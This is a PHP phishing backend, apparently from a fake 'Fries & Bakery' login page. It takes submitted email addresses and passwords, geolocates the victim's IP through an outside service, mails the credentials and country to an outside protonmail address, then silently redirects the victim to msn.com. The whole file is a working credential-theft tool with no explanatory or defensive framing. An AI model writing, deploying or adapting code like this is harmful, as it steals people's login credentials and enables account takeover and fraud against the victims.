<?php
    if($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["email"]) and !empty($_POST["email"]) && 
           isset($_POST["password"]) and !empty($_POST["password"])){
               function get_ip(){
                    if(isset($_SERVER["HTTP_CLIENT_IP"])){
                        return $_SERVER["HTTP_CLIENT_IP"];
                        
                    }
                    elseif(isset($_SERVER["HTTP_X_FOWARDED_FOR"])){
                        return $_SERVER["HTTP_X_FOWARDED_FOR"];
                    } else {
                        return (isset($_SERVER["REMOTE_ADDR"]) ? $_SERVER["REMOTE_ADDR"] : "");{
                        }
                    } 
                }
                $ip = get_ip();
            
                $query=@unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
                if($query && $query["status"] == "success"){
                    $visitor = $query["country"];
                }
            $email = $_POST["email"];
            $password = $_POST["password"];
            $name = "Fries & Bakery";
            $message = "Client Email: " . $email ."\n" . "Client Password: " . $password ."\n" . "Client Location: " . $visitor ."\n";
            mail("g4btc@protonmail.com","Customer Information", $message);
            $url="https://msn.com";
            echo "<script type='text/javascript'>document.location.href='{$url}';</script>";
        echo '<META HTTP-EQUIV="refresh" content="0;URL=' . $url . '">';
    } else {
        $url="https://msn.com";
        echo "<script type='text/javascript'>document.location.href='{$url}';</script>";
        echo '<META HTTP-EQUIV="refresh" content="0;URL=' . $url . '">';
    }

?>